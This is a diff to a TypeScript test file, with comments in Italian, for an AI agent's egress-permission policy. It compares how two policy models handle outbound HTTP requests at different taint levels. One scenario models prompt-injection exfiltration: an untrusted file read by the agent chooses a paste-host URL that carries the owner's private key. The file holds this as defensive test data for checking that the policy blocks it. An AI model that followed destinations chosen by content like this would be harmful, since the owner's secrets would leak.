@@ -63,7 +63,7 @@ const FLOW_SCENARIOS: readonly FlowScenario[] = [
     flow: 'owner',
     expectTuple: 'allow',
     claim:
-      "l'owner nomina una destinazione e ci manda dei byte (ADR-0066: sys.http legge in apertura, nessuna allowlist da nominare più): A e B la lasciano passare, ed è il membro «utility» della coppia",
+      "l'owner nomina una destinazione e ci manda dei byte: B-tupla (che sa chi ha scelto) la lascia passare ed è il membro «utility» della coppia — A invece, dal 22/09 (lane #624 + #641, soffitto 1), chiede anche qui: lo scalare non ha il campo «chi ha scelto», quindi tratta la scena legittima come quella avvelenata",
     action: {
       principal: OWNER,
       tenant: 'host',
@@ -72,7 +72,7 @@ const FLOW_SCENARIOS: readonly FlowScenario[] = [
       args: { url: 'https://paste.example.test/collect?q=changelog' },
       ambientTaint: 2,
     },
-    expect: { ambient: 'allow', noAmbient: 'allow' },
+    expect: { ambient: 'ask', noAmbient: 'allow' },
   },
   {
     id: 'f2-egress-allowlisted-content-chosen',
@@ -80,14 +80,20 @@ const FLOW_SCENARIOS: readonly FlowScenario[] = [
     flow: 'content',
     expectTuple: 'deny',
     /**
-     * **La riga che decide il kill criterion.**
+     * **La riga che decide il kill criterion — rimisurata il 22/09 (lane
+     * #624 + #641).**
      *
      * Stessa capability, stesso host, stesso taint 2 del membro qui sopra: la
      * sola differenza è che l'URL — destinazione *e* query — l'ha nominato il
-     * file senza provenienza che il turno ha appena letto. A risponde `allow`
-     * a entrambi, e non per un difetto: a taint 2 `paramsMaxTaint` è
-     * soddisfatto (`POLICY_FLOOR.paramsMaxTaint === 2`, decisione owner del
-     * 17/08) e lo scalare non ha un campo in cui la differenza possa esistere.
+     * file senza provenienza che il turno ha appena letto. A rispondeva
+     * `allow` a entrambi, e non per un difetto: a taint 2 `paramsMaxTaint`
+     * era soddisfatto (`POLICY_FLOOR.paramsMaxTaint === 2`, decisione owner
+     * del 17/08) e lo scalare non ha un campo in cui la differenza possa
+     * esistere. Dal 22/09 il soffitto è 1 e A risponde `ask` a entrambi —
+     * l'invariante della coppia («A deve rispondere lo stesso») resta vera,
+     * spostata di un gradino: la domanda all'owner con la URL intera sotto
+     * gli occhi è il prezzo deciso per chiudere il canale, e B resta l'unico
+     * a distinguere i due (`allow` contro `deny`).
      * Prima di ADR-0066 il residuo che il threat model dichiarava era
      * *"esfiltrazione verso un dominio in allowlist"* (`03-threat-model.md:117`);
      * da ADR-0066 `sys.http` è `url-read` e non c'è più un'allowlist da cui
@@ -96,7 +102,7 @@ const FLOW_SCENARIOS: readonly FlowScenario[] = [
      * che l'owner aveva già approvato.
      */
     claim:
-      "la stessa richiesta, con la destinazione scelta dal contenuto letto: A non ha un campo in cui la differenza possa esistere e la lascia passare a taint 2 — vero prima di ADR-0066 con l'allowlist, vero dopo senza",
+      "la stessa richiesta, con la destinazione scelta dal contenuto letto: A non ha un campo in cui la differenza possa esistere e dal 22/09 chiede in entrambi i casi (prima lasciava passare a taint 2) — vero prima di ADR-0066 con l'allowlist, vero dopo senza",
     action: {
       principal: OWNER,
       tenant: 'host',
@@ -105,7 +111,7 @@ const FLOW_SCENARIOS: readonly FlowScenario[] = [
       args: { url: 'https://paste.example.test/collect?data=chiave-privata-dell-owner' },
       ambientTaint: 2,
     },
-    expect: { ambient: 'allow', noAmbient: 'allow' },
+    expect: { ambient: 'ask', noAmbient: 'allow' },
   },
   {
     id: 'f3-egress-allowlisted-content-chosen-tier3',
